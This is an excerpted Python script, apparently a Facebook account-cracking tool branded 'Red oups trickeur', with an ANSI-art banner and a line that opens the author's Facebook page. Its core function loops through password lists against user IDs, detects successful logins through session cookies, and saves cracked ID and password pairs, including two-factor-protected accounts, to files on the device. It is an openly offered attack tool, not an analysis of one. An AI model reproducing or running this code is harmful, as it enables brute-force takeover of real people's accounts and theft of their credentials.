...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; The Redoupshackeur \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
sleep(1)
os.system('xdg-open https://www.facebook.com/Red.oupshack?mibextid=ZbWKwL')
logo =("""
\x1b[1;96m.
       ╲ ▁▂▂▂▁ ╱
       ▄███████▄
  ...
  ██ █████████████ ██
     █████████████
      ███████████
       ██     ██
       ██     ██  \033[1;32mRED-OUPS-TRICKEUR                                                               

\x1b[1;96m--------------------------------------------------
[~] Author   : Red oups trickeur
[~] Facebook : Red oups hackeur 
[~] Tool     : Bojo
[~] Version  : 0.10.9
\x1b[1;96m----------------------------------------------""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mRedoupshack\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\x1b[38;5;46m[Redoupstrickeur] [🤩] '+uid+' . '+ps+ ' '+Jawnx(uid)+' ')
                #print(f" Cookie : {coki}")
                cek_apk(session,coki)
                open('/sdcard/Redoupstrickeur-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/Redoupstrickeur-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                ...
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[Redoupstrickeur] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
